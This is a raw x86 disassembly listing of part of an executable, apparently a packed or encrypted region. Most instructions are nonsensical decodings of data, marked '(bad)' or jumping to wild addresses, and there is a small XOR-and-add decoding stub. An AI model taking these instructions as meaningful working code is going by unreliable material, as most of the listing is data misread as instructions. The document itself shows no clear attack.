  40e9f5:	mov    bh,0xd9
  40e9f7:	push   cs
  40e9f8:	mov    esi,0x247698f7
  40e9fd:	push   ecx
  40e9fe:	sbb    BYTE PTR [esp+ecx*8+0x26],ah
  40ea02:	stos   DWORD PTR es:[edi],eax
  40ea03:	cmp    eax,0x7538e58
  40ea08:	push   esp
  40ea09:	cmp    bl,dl
  40ea0b:	adc    BYTE PTR [eax-0x13],bl
  40ea0e:	sbb    ecx,DWORD PTR [esi+0x44]
  40ea11:	scas   al,BYTE PTR es:[edi]
  40ea12:	js     0x40e9a1
  40ea14:	inc    esi
  40ea15:	jo     0x40ea48
  40ea17:	cdq    
  40ea18:	mov    cl,0x56
  40ea1a:	hlt    
  40ea1b:	ror    BYTE PTR [esi],cl
  40ea1d:	cdq    
  40ea1e:	sbb    eax,edx
  40ea20:	shr    BYTE PTR [esi+0x6d70f5b2],0xd3
  40ea27:	mov    ebx,0x98c9726b
  40ea2c:	pop    ebx
  40ea2d:	dec    ebx
  40ea2e:	cli    
  40ea2f:	mov    ebp,0x91f9e2fa
  40ea34:	pushf  
  40ea35:	mov    ecx,DWORD PTR [eax+0x7a]
  40ea38:	push   ebx
  40ea39:	and    ebx,ebp
  40ea3b:	mul    DWORD PTR [eax+0x1db91ec5]
  40ea41:	xor    eax,0xd1312dc2
  40ea46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ea47:	pop    ecx
  40ea48:	test   BYTE PTR [ebx-0x5db731b2],cl
  40ea4e:	rcr    BYTE PTR [eax+0x462d840],0xc2
  40ea55:	icebp  
  40ea56:	sbb    esi,DWORD PTR [edx+0x1d19bd6f]
  40ea5c:	push   esi
  40ea5d:	daa    
  40ea5e:	mov    ebp,0xe6764422
  40ea63:	or     al,0x6
  40ea65:	pop    es
  40ea66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ea67:	fidiv  WORD PTR [eax-0x6feb6ab4]
  40ea6d:	or     DWORD PTR [esi-0x17e3e12e],esp
  40ea73:	pop    es
  40ea74:	bound  edi,QWORD PTR [edi+edx*1-0x1e5234f1]
  40ea7b:	mov    esi,0x1282fef0
  40ea80:	adc    BYTE PTR ds:0x795e1ef4,bh
  40ea86:	clc    
  40ea87:	dec    ecx
  40ea88:	add    ax,0x769e
  40ea8c:	mov    eax,0x8f1a9d98
  40ea91:	in     eax,0x4a
  40ea93:	lods   al,BYTE PTR ds:[esi]
  40ea94:	gs mov cs:0xf10c6edd,eax
  40ea9b:	jp     0x40ea94
  40ea9d:	mov    eax,DWORD PTR [ebp-0x8]
  40eaa0:	jmp    0x40f269
  40eaa5:	mov    eax,DWORD PTR [ebp-0x4]
  40eaa8:	mov    ecx,DWORD PTR [ebp+0x10]
  40eaab:	xor    eax,edi
  40eaad:	add    eax,esi
  40eaaf:	cmp    eax,ecx
  40eab1:	jne    0x40f266
  40eab7:	mov    eax,DWORD PTR [ebp-0x4]
  40eaba:	xor    eax,edi
  40eabc:	add    eax,esi
  40eabe:	jmp    0x40ee84
  40eac3:	icebp  
  40eac4:	jmp    0x40ea54
  40eac6:	imul   edx,DWORD PTR [edx+0x1973f175],0xf683fe94
  40ead0:	fcomp  DWORD PTR [edx+0x7cad9799]
  40ead6:	jl     0x40ea7f
  40ead8:	jns    0x40eb56
  40eada:	jl     0x40eb43
  40eadc:	push   esp
  40eadd:	pop    eax
  40eade:	xor    esp,esp
  40eae0:	fsub   DWORD PTR [esp+edx*4-0x42]
  40eae4:	jo     0x40eb14
  40eae6:	xchg   esp,eax
  40eae7:	or     edx,DWORD PTR [ebx-0x6f]
  40eaea:	pop    DWORD PTR [ebx]
  40eaec:	mov    eax,0x890f9032
  40eaf1:	scas   al,BYTE PTR es:[edi]
  40eaf2:	in     al,0x7
  40eaf4:	mov    ch,0xf
  40eaf6:	jb     0x40eb48
  40eaf8:	dec    esi
  40eaf9:	lods   eax,DWORD PTR ds:[esi]
  40eafa:	inc    eax
  40eafb:	(bad)  
  40eafc:	shl    BYTE PTR [eax-0x14],cl
  40eaff:	mov    ebx,0xc1106035
  40eb04:	shl    BYTE PTR [edi-0x140bf46e],1
  40eb0a:	sub    BYTE PTR [eax],0x42
  40eb0d:	dec    esp
  40eb0e:	jne    0x40eb00
  40eb10:	mov    dl,0x99
  40eb12:	data16 and bl,bh
  40eb15:	pop    esi
  40eb16:	add    ecx,esp
  40eb18:	mov    esp,0x74d2206f
  40eb1d:	dec    edx
  40eb1e:	xor    al,BYTE PTR [ebp+0x2d]
  40eb21:	and    DWORD PTR [ecx],0x4c2d7e51
  40eb27:	repz cmp DWORD PTR [ebx],ecx
  40eb2a:	clc    
  40eb2b:	or     eax,0xa074e82f
  40eb30:	cmp    BYTE PTR [ebx-0x47d4bbc1],al
  40eb36:	inc    edi
  40eb37:	adc    bh,BYTE PTR [esi+ecx*2-0x1f]
  40eb3b:	and    DWORD PTR [ecx-0x2e263cda],edx
  40eb41:	xlat   BYTE PTR ds:[ebx]
  40eb42:	jmp    0x2ac17ec4
  40eb47:	mov    cl,BYTE PTR ds:0xc7f975df
  40eb4d:	loope  0x40eb50
  40eb4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eb50:	inc    eax
  40eb51:	cmp    al,0x14
  40eb53:	lods   al,BYTE PTR ds:[esi]
  40eb54:	aas    
  40eb55:	sbb    al,0xd7
  40eb57:	ins    DWORD PTR es:[edi],dx
  40eb58:	inc    ecx
  40eb59:	sbb    esi,DWORD PTR [ecx-0x7e]
  40eb5c:	pop    edx
  40eb5d:	(bad)  
  40eb5e:	jnp    0x40ebbc
  40eb60:	adc    DWORD PTR [ebx],edi
  40eb62:	mov    eax,ds:0xc6c4c1db
  40eb67:	aam    0xdf
  40eb69:	sub    esp,DWORD PTR [edi]
  40eb6b:	adc    BYTE PTR [ebp+0x7e43678],cl
  40eb71:	bound  esp,QWORD PTR [esi+0x60]
  40eb74:	adc    DWORD PTR [ecx-0xf],0x5b6badac
  40eb7b:	out    dx,eax
  40eb7c:	daa    
  40eb7d:	sbb    al,0xf5
  40eb7f:	addr16 push ebp
  40eb81:	jnp    0x40ebf3
  40eb83:	or     BYTE PTR [esi+0xf],al
  40eb86:	js     0x1ebcd3dd
  40eb8c:	or     eax,0xa3e2a44e
  40eb91:	add    esp,DWORD PTR [ebp-0x23]
  40eb94:	push   eax
  40eb95:	add    BYTE PTR [edx+eax*1],dh
  40eb98:	and    DWORD PTR [edi-0x35443417],edx
  40eb9e:	push   es
  40eb9f:	(bad)  
  40eba0:	imul   edx,edi,0x59
  40eba3:	lea    ebx,[ebx+0xc7d9ac9]
  40eba9:	retf   
  40ebaa:	inc    eax
  40ebab:	enter  0x3a6e,0xed
  40ebaf:	mov    cl,0x62
  40ebb1:	inc    ebp
  40ebb2:	clc    
  40ebb3:	adc    esp,DWORD PTR [edi-0x17]
  40ebb6:	dec    eax
  40ebb7:	mov    ?,WORD PTR [esi-0x43279926]
  40ebbd:	scas   eax,DWORD PTR es:[edi]
  40ebbe:	mov    esi,fs
  40ebc0:	ja     0x40ebae
  40ebc2:	iret   
  40ebc3:	push   ebx
  40ebc4:	loope  0x40ec44
  40ebc6:	lahf   
  40ebc7:	sbb    DWORD PTR [edi],0xe5dd275b
  40ebcd:	push   edi
  40ebce:	and    ebx,ebp
  40ebd0:	fsub   DWORD PTR [ebp+0x3f13ebe9]
  40ebd6:	test   DWORD PTR [eax+0x66b6b88a],eax
  40ebdc:	addr16 aad 0xb8
  40ebdf:	ins    DWORD PTR es:[edi],dx
  40ebe0:	arpl   WORD PTR [esp+esi*2+0x58399ece],bx
  40ebe7:	fmul   st(0),st
  40ebe9:	mov    esp,0xd9318b56
  40ebee:	(bad)  
  40ebf1:	les    edi,FWORD PTR [ebx]
  40ebf3:	lds    ebp,FWORD PTR [ecx-0x3f]
  40ebf6:	xchg   edi,eax
  40ebf7:	push   es
  40ebf8:	sbb    al,0x57
  40ebfa:	mov    ecx,0x3b569a22
  40ebff:	sub    ebx,ecx
  40ec01:	adc    edi,DWORD PTR [ecx+0x428234c2]
  40ec07:	rcl    DWORD PTR [ebx-0x1a8df75f],cl
  40ec0d:	inc    ebx
  40ec0e:	outs   dx,BYTE PTR ds:[esi]
  40ec0f:	push   ebp
  40ec10:	cmp    eax,0x7d8f1508
  40ec15:	pop    edi
  40ec16:	add    ch,dh
  40ec18:	adc    esi,DWORD PTR [edx+0x3f25b191]
  40ec1e:	les    ecx,FWORD PTR [ebx-0x5b3bedaa]
  40ec24:	adc    ebx,esi
  40ec26:	scas   al,BYTE PTR es:[edi]
  40ec27:	mov    dh,0xcd
  40ec29:	mov    ch,BYTE PTR [ebp+0x51]
  40ec2c:	jae    0x40ebe1
  40ec2e:	cwde   
  40ec2f:	sub    DWORD PTR [ebx+0x39cccee8],ebp
  40ec35:	mov    eax,ds:0xc94a6107
  40ec3a:	nop
  40ec3b:	nop
  40ec3c:	fcmovb st,st(7)
  40ec3e:	pop    esp
  40ec3f:	icebp  
  40ec40:	and    DWORD PTR [edi-0x5f],0xffffff83
  40ec44:	nop
  40ec45:	call   0x174b428a
  40ec4a:	iret   
  40ec4b:	in     al,0xd3
  40ec4d:	cli    
  40ec4e:	xchg   esp,eax
  40ec4f:	add    al,0x97
  40ec51:	arpl   WORD PTR [edx-0x44a64840],bp
  40ec57:	dec    edx
  40ec58:	or     edi,esp
  40ec5a:	and    ah,BYTE PTR [edi-0x6e]
  40ec5d:	pop    eax
  40ec5e:	or     DWORD PTR [ebx],ebx
  40ec60:	push   edx
  40ec61:	sbb    BYTE PTR [ebp+0x3d90a68e],al
  40ec67:	imul   esp,ebx,0x39adc178
  40ec6d:	retf   0xa69e
  40ec70:	xchg   BYTE PTR ds:0x527164e9,cl
  40ec76:	push   esi
  40ec77:	mov    eax,0xfa2523dd
  40ec7c:	mov    edx,0xda898ac5
  40ec81:	imul   edi,DWORD PTR [ebx+0xcc40bc6],0xbf0de4e1
  40ec8b:	pop    esp
  40ec8c:	mov    esp,0x31addc2e
  40ec91:	mov    bh,0xd7
  40ec93:	pop    ebx
  40ec94:	jo     0x40ec26
  40ec96:	aaa    
  40ec97:	push   ds
  40ec98:	dec    edx
  40ec99:	enter  0x8301,0x26
  40ec9d:	(bad)  
  40ec9f:	ror    edx,1
  40eca1:	and    ebp,esi
  40eca3:	jmp    0x40ec84
  40eca5:	push   cs
  40eca6:	in     al,dx
  40eca7:	retf   
  40eca8:	ins    BYTE PTR es:[edi],dx
  40eca9:	push   bp
  40ecab:	cmc    
  40ecac:	arpl   WORD PTR [ebp+0x52],dx
  40ecaf:	push   ds
  40ecb0:	ret    0xb45b
  40ecb3:	xchg   ebp,eax
  40ecb4:	mov    ds:0x1f4e17cd,eax
  40ecb9:	bound  esi,QWORD PTR [eax]
  40ecbb:	cwde   
  40ecbc:	push   ebx
  40ecbd:	dec    ebp
  40ecbe:	scas   eax,DWORD PTR es:[edi]
  40ecbf:	rcr    DWORD PTR [eax+edx*1-0x7],cl
  40ecc3:	(bad)  
  40ecc4:	xor    DWORD PTR [ebx-0x66bb5494],eax
  40ecca:	fdiv   QWORD PTR [ebx+0x146c255d]
  40ecd0:	xchg   esp,eax
  40ecd1:	lock xor DWORD PTR [edi-0x70],esi
  40ecd5:	(bad)  
  40ecd6:	jns    0x40ed4a
  40ecd8:	pop    ebx
  40ecd9:	ret    0x5b84
  40ecdc:	hlt    
  40ecdd:	fnstcw WORD PTR [edx-0x49]
  40ece0:	div    al
  40ece2:	loopne 0x40ed22
  40ece4:	fld    DWORD PTR ss:[ecx-0x16ec2ec2]
  40eceb:	pop    es
  40ecec:	cmp    dl,dh
  40ecee:	sbb    DWORD PTR [edi+esi*8],eax
  40ecf1:	(bad)  
  40ecf2:	stos   DWORD PTR es:[edi],eax
  40ecf3:	inc    eax
  40ecf4:	jecxz  0x40ec8e
  40ecf6:	push   cs
  40ecf7:	adc    bh,bl
  40ecf9:	retf   
  40ecfa:	push   eax
  40ecfb:	or     dl,BYTE PTR ds:0x454646c9
  40ed01:	outs   dx,DWORD PTR ds:[esi]
  40ed02:	fld    TBYTE PTR [ecx]
  40ed04:	jle    0x40ec9f
  40ed06:	mov    ds:0x267b2151,eax
  40ed0b:	imul   ebp,DWORD PTR [ecx],0x49
  40ed0e:	call   0xcffab7
  40ed13:	stos   DWORD PTR es:[edi],eax
  40ed14:	cmp    al,0x2b
  40ed16:	stos   DWORD PTR es:[edi],eax
  40ed17:	shl    edx,cl
  40ed19:	scas   al,BYTE PTR es:[edi]
  40ed1a:	sbb    ch,al
  40ed1c:	cmp    bl,BYTE PTR [ecx+eax*1]
  40ed1f:	inc    ecx
  40ed20:	pop    edx
  40ed21:	jnp    0x40ecd7
  40ed23:	inc    edx
  40ed24:	in     eax,dx
  40ed25:	out    dx,eax
  40ed26:	push   eax
  40ed27:	mov    ebp,0xe39fdd29
  40ed2c:	push   edi
  40ed2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ed2e:	sub    edx,0x39
  40ed31:	popf   
  40ed32:	or     ch,dl
  40ed34:	sahf   
  40ed35:	pop    eax
  40ed36:	icebp  
  40ed37:	lea    ebp,[ebp-0x50]
  40ed3a:	pop    ss
  40ed3b:	jg     0x40ed37
  40ed3d:	xor    eax,0x69b99372
  40ed42:	xchg   ecx,eax
  40ed43:	jmp    0x17403c76
  40ed48:	pop    edx
  40ed49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ed4a:	in     eax,0x29
  40ed4c:	mov    bh,0x54
  40ed4e:	loope  0x40ed98
  40ed50:	retf   0x4a8a
  40ed53:	sbb    DWORD PTR gs:[edi-0x36],ecx
  40ed57:	xchg   BYTE PTR [eax+0xc],dl
  40ed5a:	in     eax,dx
  40ed5b:	rol    esp,0xd7
  40ed5e:	pop    edx
  40ed5f:	add    cl,BYTE PTR [esi]
  40ed61:	mov    eax,0x74675bbd
  40ed66:	fmul   DWORD PTR [esi]
  40ed68:	inc    eax
  40ed69:	(bad)  
  40ed6a:	xlat   BYTE PTR ds:[ebx]
  40ed6b:	xor    esi,eax
  40ed6d:	push   edi
  40ed6e:	jg     0x40ed61
  40ed70:	xchg   edx,eax
  40ed71:	out    dx,al
  40ed72:	arpl   WORD PTR [eax],bp
  40ed74:	and    BYTE PTR [ebx+edi*8+0x36435828],ah
  40ed7b:	jmp    0x40ed28
  40ed7d:	int    0xc
  40ed7f:	ins    BYTE PTR es:[edi],dx
  40ed80:	leave  
  40ed81:	dec    esp
  40ed82:	je     0x40ed18
  40ed84:	xor    al,BYTE PTR [edx-0x6449b89e]
  40ed8a:	and    edi,edx
  40ed8c:	scas   al,BYTE PTR es:[edi]
  40ed8d:	sbb    BYTE PTR [edi],ch
  40ed8f:	lods   al,BYTE PTR ds:[esi]
  40ed90:	xchg   ebx,eax
  40ed91:	inc    ebx
  40ed92:	clc    
  40ed93:	jbe    0x40ed8d
  40ed95:	jecxz  0x40ed3b
  40ed97:	das    
  40ed98:	or     al,0xa
  40ed9a:	popa   
  40ed9b:	je     0x40edfa
  40ed9d:	add    ch,BYTE PTR [eax]
  40ed9f:	int3   
  40eda0:	pop    ds
  40eda1:	inc    ecx
  40eda2:	xchg   DWORD PTR [eax-0x6a01548e],esp
  40eda8:	fwait
  40eda9:	jecxz  0x40edcb
  40edab:	test   eax,0xa423dee
  40edb0:	xor    esp,edx
  40edb2:	adc    DWORD PTR [esi+0x693ed122],eax
  40edb8:	add    al,0xbb
  40edba:	les    ecx,FWORD PTR ds:0xf863c0f3
  40edc0:	aam    0x20
  40edc2:	jo     0x40ed7f
  40edc4:	loop   0x40edf0
  40edc6:	push   esp
  40edc8:	ret    0x87ef
  40edcb:	ret    
  40edcc:	loop   0x40ed52
  40edce:	mov    ah,0xd3
  40edd0:	sbb    eax,0x616419bd
  40edd5:	pop    esi
  40edd6:	fcomp  DWORD PTR [edx+0x21]
  40edd9:	add    eax,0x94a137aa
  40edde:	inc    ebx
  40eddf:	mov    eax,ds:0xdf73f6dd
  40ede4:	jne    0x40ee2e
  40ede6:	or     al,0x4f
  40ede8:	mov    esi,0x4ae59a01
  40eded:	inc    eax
  40edee:	in     al,0x6a
  40edf0:	inc    eax
  40edf1:	fwait
  40edf2:	jge    0x40edfe
  40edf4:	stos   BYTE PTR es:[edi],al
  40edf5:	xor    eax,DWORD PTR [esi+eax*4+0x59c738cf]
  40edfc:	mov    WORD PTR [edi-0x68b2fa68],?
  40ee02:	into   
  40ee03:	mov    ah,0xd6
  40ee05:	int3   
  40ee06:	loop   0x40eddb
  40ee08:	mov    edx,0x18b4f2ba
  40ee0d:	adc    eax,0xa8009b20
  40ee12:	inc    ecx
  40ee13:	outs   dx,DWORD PTR ds:[esi]
  40ee14:	push   0x29
  40ee16:	imul   ecx,DWORD PTR [ebx-0x7d],0xea409983
  40ee1d:	add    BYTE PTR [ebx-0x2c13a751],dh
  40ee23:	cmp    DWORD PTR [eax+0x17],ecx
  40ee26:	leave  
  40ee27:	(bad)  
  40ee28:	js     0x40ee3c
  40ee2a:	sub    cl,BYTE PTR [edx]
  40ee2c:	xor    ch,BYTE PTR [ecx-0x6ffa4642]
  40ee32:	lahf   
  40ee33:	cmp    DWORD PTR [ebx+0x641cf1b5],ebx
  40ee39:	out    dx,al
  40ee3a:	sub    eax,0xc85d7aac
  40ee3f:	leave  
  40ee40:	fsub   st(2),st
  40ee42:	outs   dx,BYTE PTR ds:[esi]
  40ee43:	push   eax
  40ee44:	mov    ds:0xc542d4c0,eax
  40ee49:	sbb    BYTE PTR [ebx+0x41],dh
  40ee4c:	mov    WORD PTR ds:0x69a8d548,es
  40ee52:	jmp    0x40ee22
  40ee54:	sub    eax,DWORD PTR [esi]
  40ee56:	adc    DWORD PTR ds:0xb73fe227,0x39d6a2e7
  40ee60:	or     BYTE PTR [esi],cl
  40ee62:	inc    ecx
  40ee63:	mov    ah,BYTE PTR [eax]
  40ee65:	pop    esp
  40ee66:	mov    edx,0xbac65020
  40ee6b:	cwde   
  40ee6c:	xor    DWORD PTR [edx+ebx*4-0x73],esp
  40ee70:	mov    dl,0xbd
  40ee72:	mov    ds:0xdee40951,al
  40ee77:	leave  
  40ee78:	pop    ecx
  40ee79:	lock retf 
  40ee7b:	sbb    eax,0x29b43294
  40ee80:	fwait
  40ee81:	sub    al,0x37
  40ee83:	mov    al,0xa3
  40ee85:	call   0xfc45:0x8b00413b
  40ee8c:	xor    eax,edi
  40ee8e:	add    eax,esi
  40ee90:	mov    ds:0x413b92,eax
  40ee95:	jmp    0x40f25b
  40ee9a:	push   edi
  40ee9b:	mov    DWORD PTR ds:0x7d73cde7,eax
  40eea1:	test   eax,0x57232fd2
  40eea6:	jno    0x40eef4
  40eea8:	lea    esp,[edi]
  40eeaa:	ds test eax,0x79a77c7c
  40eeb0:	jl     0x40ef2e
  40eeb2:	adc    DWORD PTR [eax],ebp
  40eeb4:	outs   dx,DWORD PTR ds:[esi]
  40eeb5:	inc    ebx
  40eeb6:	inc    edi
  40eeb7:	call   0x402a328a
  40eebc:	loopne 0x40ee58
  40eebe:	pop    eax
  40eebf:	bound  edi,QWORD PTR [eax+0x275da497]
  40eec5:	scas   al,BYTE PTR es:[edi]
  40eec6:	xchg   esi,eax
  40eec7:	imul   edi,ebp,0x6bf3d9ac
  40eecd:	adc    ecx,esp
  40eecf:	pop    esp
  40eed0:	popf   
  40eed1:	pushf  
  40eed2:	pushf  
  40eed3:	cmp    eax,0x5c46aff6
  40eed8:	cwde   
  40eed9:	push   0xffffffcc
  40eedb:	lahf   
  40eedc:	sbb    BYTE PTR [edi+0x77],bh
  40eedf:	mov    fs,ecx
  40eee1:	jno    0x40ef55
  40eee3:	(bad)  [eax-0x2d48d6aa]
  40eee9:	mov    DWORD PTR [ecx+ebx*1+0x275f85b7],edx
  40eef0:	icebp  
  40eef1:	mov    WORD PTR [edx],?
  40eef3:	dec    esi
  40eef4:	jno    0x40ef2a
  40eef6:	push   ds
  40eef7:	jecxz  0x40eed7
  40eef9:	add    bl,BYTE PTR [ebx-0x47bd23dd]
  40eeff:	cmp    ecx,ebx
  40ef01:	mov    al,0x25
  40ef03:	pop    es
  40ef04:	xor    ch,ch
  40ef06:	jle    0x40eebb
  40ef08:	fnstcw WORD PTR [ecx+0x50a12afd]
  40ef0e:	add    BYTE PTR ds:0xd60e3df0,bh
  40ef14:	xor    DWORD PTR [esi],ebx
  40ef16:	push   0xffffffc5
  40ef18:	lock mov bl,0x7c
  40ef1b:	retf   0x7dc2
  40ef1e:	and    DWORD PTR [eax-0x7a],0xb908dc2a
  40ef25:	(bad)  
  40ef26:	cli    
  40ef27:	adc    eax,0xd797547a
  40ef2c:	or     BYTE PTR [ecx],cl
  40ef2e:	ror    ah,0x33
  40ef31:	js     0x40ef2e
  40ef33:	call   0x73b7:0x57864129
  40ef3a:	mov    ds:0x5e009690,al
  40ef3f:	inc    sp
  40ef41:	pusha  
  40ef42:	sahf   
  40ef43:	sbb    ch,0xd7
  40ef46:	fwait
  40ef47:	and    eax,0xf51935ef
  40ef4c:	inc    esp
  40ef4d:	popf   
  40ef4e:	add    DWORD PTR [eax],esi
  40ef50:	not    BYTE PTR [ecx-0xa7d5305]
  40ef56:	push   0xed6f60de
  40ef5b:	cld    
  40ef5c:	mov    ebx,fs
  40ef5e:	dec    edx
  40ef5f:	out    0xc7,eax
  40ef61:	jo     0x40eee8
  40ef63:	add    ebx,edi
  40ef65:	mov    esi,0x45a5cc6e
  40ef6a:	cmp    BYTE PTR [ebp+0x4407ee75],al
  40ef70:	rcl    DWORD PTR [ebp-0x36],0x36
  40ef74:	ror    BYTE PTR [ecx],1
  40ef76:	xchg   DWORD PTR [ecx-0x4c],ebp
  40ef79:	inc    edx
  40ef7a:	in     eax,0xfc
  40ef7c:	sar    BYTE PTR [eax+0x3a],1
  40ef7f:	push   ebp
  40ef80:	or     al,0x1b
  40ef82:	fstp   DWORD PTR [ebp+0x2bdd2926]
  40ef88:	xor    eax,0x957dbdff
  40ef8d:	shl    BYTE PTR [eax+0x4c],1
  40ef90:	test   ah,ch
  40ef92:	sbb    DWORD PTR [esi+0x5d5f457],ecx
  40ef98:	ins    BYTE PTR es:[edi],dx
  40ef99:	mov    ah,0x96
  40ef9b:	xchg   esp,eax
  40ef9c:	mov    ds:0xdbf403ff,eax
  40efa1:	jle    0x40ef9e
  40efa3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40efa4:	aad    0xa9
  40efa6:	outs   dx,DWORD PTR ds:[esi]
  40efa7:	sub    bh,BYTE PTR [esi+0x10]
  40efaa:	sub    ebx,DWORD PTR [edi-0x52]
  40efad:	cmp    BYTE PTR [edi-0x16],al
  40efb0:	xchg   DWORD PTR [ecx-0x2b7cbf17],esi
  40efb6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40efb7:	mov    dh,0xfd
  40efb9:	(bad)  
  40efba:	mov    ds:0xdf4b3055,eax
  40efbf:	(bad)  
  40efc0:	push   ecx
  40efc1:	loope  0x40ef45
  40efc3:	pushf  
  40efc4:	stc    
  40efc5:	add    eax,0x635d6489
  40efca:	xchg   BYTE PTR [ecx-0x6edc31a0],dh
  40efd0:	dec    esp
  40efd1:	mov    bl,0x67
  40efd3:	call   0x46563e89
  40efd8:	push   edx
  40efd9:	inc    esi
  40efda:	add    al,0x89
  40efdc:	pop    eax
  40efdd:	xlat   BYTE PTR fs:[ebx]
  40efdf:	lea    esp,[ebp+eiz*2-0x208b9dc2]
  40efe6:	aas    
  40efe7:	mov    edi,0x62c43ff
  40efec:	mov    WORD PTR [eax-0x26],ds
  40efef:	jae    0x40f00b
  40eff1:	out    0x7d,eax
  40eff3:	mov    ds:0x627252ff,al
  40eff8:	into   
  40eff9:	inc    ecx
  40effa:	cmp    al,BYTE PTR [ebp+0x55]
  40effd:	push   0x8d00879c
  40f002:	aas    
  40f003:	bound  eax,QWORD PTR [ebx-0x17]
  40f006:	into   
  40f007:	lods   al,BYTE PTR ds:[esi]
  40f008:	sub    esp,DWORD PTR [eax]
  40f00a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f00b:	cmp    cl,BYTE PTR [ecx-0x5c28dc65]
  40f011:	cmp    esi,DWORD PTR [edx-0x101e1ece]
  40f017:	adc    eax,0xdf1fdb78
  40f01c:	or     DWORD PTR [esi+0x6c4cd149],0xffffffd9
  40f023:	mov    ecx,DWORD PTR [edx+0x7f]
  40f026:	sub    al,0x23
  40f028:	mov    ch,BYTE PTR ds:0x6b235f96
  40f02e:	(bad)  
  40f02f:	out    dx,eax
  40f030:	jmp    0x10e11de6
  40f035:	mov    BYTE PTR [eax+0x40],dh
  40f038:	pop    ecx
  40f039:	push   ss
  40f03a:	stos   BYTE PTR es:[edi],al
  40f03b:	add    al,0x52
  40f03d:	nop
  40f03e:	mov    WORD PTR [ecx],gs
  40f040:	pop    esp
  40f041:	(bad)  
  40f042:	and    DWORD PTR [ecx+0x59],esi
  40f045:	clc    
  40f046:	sub    al,0x12
  40f048:	mov    al,ds:0xb58850c6
  40f04d:	and    DWORD PTR [edi],0xffffffe1
  40f050:	pusha  
  40f051:	mov    edx,ds
  40f053:	mov    al,0xd1
  40f055:	loope  0x40f0cf
  40f057:	xchg   edx,eax
  40f058:	pop    esi
  40f059:	mov    dl,0x39
  40f05b:	mov    esi,ebp
  40f05d:	push   cs
  40f05e:	bound  esi,QWORD PTR [edi+0x62665417]
  40f064:	and    eax,0xa890ab6d
  40f069:	adc    DWORD PTR [ecx-0x50],eax
  40f06c:	mov    edi,0xb58ac017
  40f071:	dec    ecx
  40f072:	dec    edi
  40f073:	xor    DWORD PTR fs:[edx],ecx
  40f076:	mov    ebx,0x5a8010ea
  40f07b:	pop    ebx
  40f07c:	imul   ecx,DWORD PTR [ebx+0x2f4e9998],0xffffff88
  40f083:	jbe    0x40f069
  40f085:	xchg   BYTE PTR [ecx-0x75594bc5],ch
  40f08b:	push   es
  40f08c:	mov    DWORD PTR [eax-0x4d52b105],ebp
  40f092:	dec    esp
  40f093:	scas   al,BYTE PTR es:[edi]
  40f094:	sub    eax,0xd3388230
  40f099:	pusha  
  40f09a:	push   edx
  40f09b:	xor    al,0x35
  40f09d:	test   DWORD PTR [ecx*1-0x37101a5f],0x71b087fc
  40f0a8:	mov    edi,0x7946dbf8
  40f0ad:	jo     0x40f0da
  40f0af:	(bad)  
  40f0b0:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f0b2:	inc    esp
  40f0b3:	xchg   BYTE PTR [esi],bl
  40f0b5:	loopne 0x40f098
  40f0b7:	inc    ebx
  40f0b8:	push   edi
  40f0b9:	retf   
  40f0ba:	jno    0x40f0c1
  40f0bc:	jno    0x40f108
  40f0be:	fldenv [esi+ebx*2]
  40f0c1:	repz sub al,0x46
  40f0c4:	retf   
  40f0c5:	es iret 
  40f0c7:	cs clc 
  40f0c9:	adc    eax,0xe4c0e816
  40f0ce:	dec    esi
  40f0cf:	mov    ebp,0x85ac927
  40f0d4:	and    ecx,DWORD PTR [eax-0xb397c70]
  40f0da:	jae    0x40f062
  40f0dc:	(bad)  
  40f0de:	(bad)  
  40f0e0:	push   eax
  40f0e1:	js     0x40f103
  40f0e3:	enter  0xa92e,0x17
  40f0e7:	pop    esp
  40f0e8:	retf   0x73ec
  40f0eb:	adc    DWORD PTR [ecx],ecx
  40f0ed:	dec    ebp
  40f0ee:	lods   al,BYTE PTR ds:[esi]
  40f0ef:	sub    al,0x65
  40f0f1:	enter  0xdeb3,0x2f
  40f0f5:	jge    0x40f103
  40f0f7:	pop    esi
  40f0f8:	add    BYTE PTR [eax-0x40fbc117],cl
  40f0fe:	cld    
  40f0ff:	(bad)  
  40f100:	adc    eax,0xc5f7bb28
  40f105:	je     0x40f0c3
  40f107:	mov    esp,0x6a5d10b5
  40f10c:	adc    edi,DWORD PTR [ebp+0x1f]
  40f10f:	repz pop ss
  40f111:	xchg   ebx,eax
  40f112:	mov    esi,0x6e5b4212
  40f117:	add    eax,0xbed5ffa0
  40f11c:	arpl   di,cx
  40f11e:	xor    al,0xd5
  40f120:	xchg   ecx,eax
  40f121:	dec    DWORD PTR [edx-0x74]
  40f124:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f125:	repnz adc DWORD PTR [esi],esp
  40f128:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f129:	(bad)  
  40f12a:	mov    dh,al
  40f12c:	(bad)  
  40f12d:	xor    eax,0x72d4c91b
  40f132:	mov    ecx,esi
  40f134:	sub    BYTE PTR [eax],ch
  40f136:	pop    ss
  40f137:	cwde   
  40f138:	mov    bl,0x29
  40f13a:	mov    ds:0x5d4f2a72,al
  40f13f:	mov    dl,0x75
  40f141:	sub    al,0xe
  40f143:	and    cl,bl
  40f145:	xor    edi,eax
  40f147:	test   dh,ch
  40f149:	push   0xcf0a90cc
  40f14e:	xor    eax,esp
  40f150:	aas    
  40f151:	retf   
  40f152:	push   edi
  40f153:	arpl   WORD PTR [ecx],cx
  40f155:	adc    ebp,DWORD PTR [ebx]
  40f157:	lea    ecx,[ebx]
  40f159:	xchg   BYTE PTR [edx+edi*8],ah
  40f15c:	mov    bh,0x7
  40f15e:	xchg   esp,eax
  40f15f:	paddusw mm1,mm6
  40f162:	ins    DWORD PTR es:[edi],dx
  40f163:	push   ecx
  40f164:	int3   
  40f165:	and    esi,edi
  40f167:	jl     0x40f151
  40f169:	mov    cl,0x3f
  40f16b:	mov    bh,0x8b
  40f16d:	dec    edi
  40f16e:	push   es
  40f16f:	mov    ds:0x68a5840e,al
  40f174:	jge    0x40f1b0
  40f176:	ins    BYTE PTR es:[edi],dx
